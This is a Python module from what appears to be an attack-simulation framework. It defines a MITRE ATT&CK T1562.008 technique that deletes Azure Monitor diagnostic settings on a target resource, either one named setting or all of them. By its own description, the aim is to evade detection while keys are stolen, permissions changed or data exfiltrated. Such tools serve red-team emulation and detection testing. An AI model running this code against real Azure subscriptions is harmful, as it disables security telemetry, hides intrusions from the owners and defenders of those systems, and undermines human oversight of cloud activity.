from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple
from azure.mgmt.monitor import MonitorManagementClient
from core.azure.azure_access import AzureAccess

@TechniqueRegistry.register
class AzureDisableResourceDiagnosticLogging(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1562.008",
                technique_name="Impair Defenses",
                tactics=["Defense Evasion"],
                sub_technique_name="Disable or Modify Cloud Logs"
            )
        ]
        super().__init__("Disable Resource Diagnostic Logging", "Disables diagnostic logging on Azure resources to evade detection during an attack. This defense evasion technique can selectively disable logging for specific resources or remove all diagnostic settings from a target resource. When diagnostic settings are disabled, critical activities like administrative actions, security events, and resource modifications are no longer captured in Azure Monitor logs, helping to operate without generating telemetry. Commonly used to hide malicious activities like key theft, permission changes, or data exfiltration.", mitre_techniques)

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)
        try:
            resource_uri: str = kwargs["resource_uri"]
            diagnostic_setting_name: str = kwargs.get("diagnostic_setting_name", None)
            delete_all_diagnostic_settings_for_resource: bool = kwargs.get("delete_all_diagnostic_settings_for_resource", False)

            # Input validation
            if resource_uri in ["", None]:
                return ExecutionStatus.FAILURE, {
                    "error": "Invalid Technique Input",
                    "message": {"input_required": "Resource URI"}
                }
            
            if diagnostic_setting_name in ["", None] and delete_all_diagnostic_settings_for_resource == False:
                return ExecutionStatus.FAILURE, {
                    "error": "Invalid Technique Input",
                    "message": {"input_required": "Diadnostic Setting Name"}
                }

            # Get credential
            credential = AzureAccess.get_azure_auth_credential()
            # Retrieve subscription id
            current_sub_info = AzureAccess().get_current_subscription_info()
            subscription_id = current_sub_info.get("id")
            
            # Create client
            monitor_client = MonitorManagementClient(credential, subscription_id)

            result = []
            
            # Attempt to disable diagnostic logging
            if diagnostic_setting_name:
                monitor_client.diagnostic_settings.delete(resource_uri, diagnostic_setting_name)

                result.append({
                        "resource_uri" : resource_uri,
                        "diagnostic_setting_name" : diagnostic_setting_name,
                        "diagnostic_setting_deleted" : True
                    })
            
            else:
                # Find diagnostic settings for the resource
                diagnostic_settings = monitor_client.diagnostic_settings.list(resource_uri)
                
                # Attempt to delete all diagnostic settings found
                result = []
                for setting in diagnostic_settings:
                    try:
                        monitor_client.diagnostic_settings.delete(resource_uri, setting.name)
                        result.append(
                            {
                                "resource_uri" : resource_uri,
                                "diagnostic_setting_name" : setting.name,
                                "diagnostic_setting_deleted" : True
                            }
                        )
                    except:
                        result.append(
                            {
                                "resource_uri" : resource_uri,
                                "diagnostic_setting_name" : setting.name,
                                "diagnostic_setting_deleted" : False
                            }
                        )

            return ExecutionStatus.SUCCESS, {
                    "message": f"Successfully deleted diagnostic setting {diagnostic_setting_name}",
                    "value": result
                }
        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": f"Failed to delete diagnostic setting {diagnostic_setting_name} for resource {resource_uri}"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "resource_uri": {"type": "str", "required": True, "default": None, "name": "Resource URI", "input_field_type" : "text"},
            "diagnostic_setting_name": {"type": "str", "required": False, "default": None, "name": "Diagnostic Setting Name", "input_field_type" : "text"},
            "delete_all_diagnostic_settings_for_resource": {"type": "bool", "required": False, "default": False, "name": "Find and Delete All Diagnostic Setting for Resource", "input_field_type" : "bool"}
        }